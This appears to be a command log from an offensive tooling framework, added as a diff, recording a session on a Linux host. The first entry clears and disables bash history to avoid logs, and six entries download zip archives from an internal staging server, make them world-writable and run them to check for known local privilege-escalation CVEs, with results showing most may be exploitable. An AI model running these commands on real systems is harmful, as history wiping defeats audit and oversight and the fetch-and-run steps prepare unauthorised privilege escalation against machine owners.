@@ -1,0 +1,45 @@
+2022-10-29-23:49:00
+1	Avoid logs	> $HOME/.bash_history && unset HISTFILE	
+2	Manual Command	ls	splunkd
+testfile
+test_file1
+test_file2
+test_folder1
+test_folder2
+
+3	detect_CVE-2021-4034	mkdir CVE-2021-4034_detect;cd CVE-2021-4034_detect;curl -O http://192.168.22.184:8000/./plugins/manncmd/CVEs/useable/linux/CVE-2021-4034/detect/detect.zip;unzip detect.zip;chmod -R 777 *;./detect.sh  > result;	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   343  100   343    0     0  24500      0 --:--:-- --:--:-- --:--:-- 24500
+
+4	detect_CVE-2022-0847	mkdir CVE-2022-0847_detect;cd CVE-2022-0847_detect;curl -O http://192.168.22.184:8000/./plugins/manncmd/CVEs/useable/linux/CVE-2022-0847/detect/detect.zip;unzip detect.zip;chmod -R 777 *;./detect.sh  > result;	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   384  100   384    0     0  17454      0 --:--:-- --:--:-- --:--:-- 17454
+
+5	detect_CVE-2021-3156	mkdir CVE-2021-3156_detect;cd CVE-2021-3156_detect;curl -O http://192.168.22.184:8000/./plugins/manncmd/CVEs/useable/linux/CVE-2021-3156/detect/detect.zip;unzip detect.zip;chmod -R 777 *;./detect.sh  > result;	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   406  100   406    0     0  67666      0 --:--:-- --:--:-- --:--:-- 67666
+
+6	detect_CVE-2021-3493	mkdir CVE-2021-3493_detect;cd CVE-2021-3493_detect;curl -O http://192.168.22.184:8000/./plugins/manncmd/CVEs/useable/linux/CVE-2021-3493/detect/detect.zip;unzip detect.zip;chmod -R 777 *;./detect.sh  > result;	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   448  100   448    0     0  29866      0 --:--:-- --:--:-- --:--:-- 29866
+
+7	detect_CVE-2021-3490	mkdir CVE-2021-3490_detect;cd CVE-2021-3490_detect;curl -O http://192.168.22.184:8000/./plugins/manncmd/CVEs/useable/linux/CVE-2021-3490/detect/detect.zip;unzip detect.zip;chmod -R 777 *;./detect.sh  > result;	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   380  100   380    0     0  29230      0 --:--:-- --:--:-- --:--:-- 29230
+
+8	detect_CVE-2022-2588	mkdir CVE-2022-2588_detect;cd CVE-2022-2588_detect;curl -O http://192.168.22.184:8000/./plugins/manncmd/CVEs/useable/linux/CVE-2022-2588/detect/detect.zip;unzip detect.zip;chmod -R 777 *;./detect.sh  > result;	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   381  100   381    0     0  95250      0 --:--:-- --:--:-- --:--:-- 95250
+
+9	test_detect_CVE-2021-4034	cd CVE-2021-4034_detect;cat result;	May be vulnerable to CVE-2021-4034
+
+10	test_detect_CVE-2022-0847	cd CVE-2022-0847_detect;cat result;	May be vulnerable to CVE-2022-0847
+
+11	test_detect_CVE-2021-3156	cd CVE-2021-3156_detect;cat result;	not vulnerable to CVE-2021-3156
+
+12	test_detect_CVE-2021-3493	cd CVE-2021-3493_detect;cat result;	May be vulnerable to CVE-2021-3493
+
+13	test_detect_CVE-2021-3490	cd CVE-2021-3490_detect;cat result;	May be vulnerable to CVE-2021-3490
+
+14	test_detect_CVE-2022-2588	cd CVE-2022-2588_detect;cat result;	May be vulnerable to CVE-2022-2588
+
